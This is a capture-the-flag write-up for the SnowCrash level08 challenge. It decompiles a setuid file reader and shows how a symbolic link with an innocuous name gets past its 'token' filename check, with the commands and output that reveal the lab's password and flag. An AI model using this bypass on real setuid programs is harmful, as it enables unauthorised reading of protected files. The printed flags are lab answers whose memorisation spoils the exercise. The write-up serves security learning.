## Solution

```console
level08@SnowCrash:~$ ls -l
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```
We have an executable which we can launch, and a token we can not access  
Lets deassemble the executable

```c
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  int fd;
  int rc;
  char buf [1024];
  undefined local_414 [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);

  //Check nb agrs
  if (argc == 1) {
    printf("%s [file to read]\n",*argv);
                    // WARNING: Subroutine does not return
    exit(1);
  }

  //Check si filename contains "token"
  pcVar1 = strstr(argv[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",argv[1]);
                    // WARNING: Subroutine does not return
    exit(1);
  }

  //open file
  __fd = open(argv[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",argv[1]);
  }

  // read file
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }

  //write on stdout content of file
  sVar2 = write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return sVar2;
}
```

`level08` seems to be an executable that open and then reads the content of the file whose
name is passed as a parameter

```console
level08@SnowCrash:~$ echo "toto" > /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
toto
```

However, if the filename contains "token" it will output an error messsage and then exit
```c
pcVar1 = strstr(argv[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",argv[1]);
                    // WARNING: Subroutine does not return
    exit(1);
  }
```

```console
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

## Pistes

Je suppose que le flag / le password du user flag08 est dans token  

```console
level08@SnowCrash:~$ mv token test
mv: cannot move `token' to `test': Permission denied
```

Symbolic link?

```console
level08@SnowCrash:~$ ln -s token /tmp/hacktest
level08@SnowCrash:~$ ./level08 /tmp/hacktest 
level08@SnowCrash:~$ echo $?
0
```
No Error no output?  
But this works
```console
level08@SnowCrash:~$ ./level08 /tmp/test
toto
level08@SnowCrash:~$ ln -s /tmp/test /tmp/test2
level08@SnowCrash:~$ ./level08 /tmp/test2
toto
```
And this too
```console
level08@SnowCrash:~$ ln -s token /tmp/token2
level08@SnowCrash:~$ ./level08 /tmp/token2
You may not access '/tmp/token2'
```

ABSOLUTE LINK WORKS
```console
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/hacktest
level08@SnowCrash:~$ ./level08 /tmp/hacktest
quif5eloekouj29ke0vouxean
```

`quif5eloekouj29ke0vouxean`

```console
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
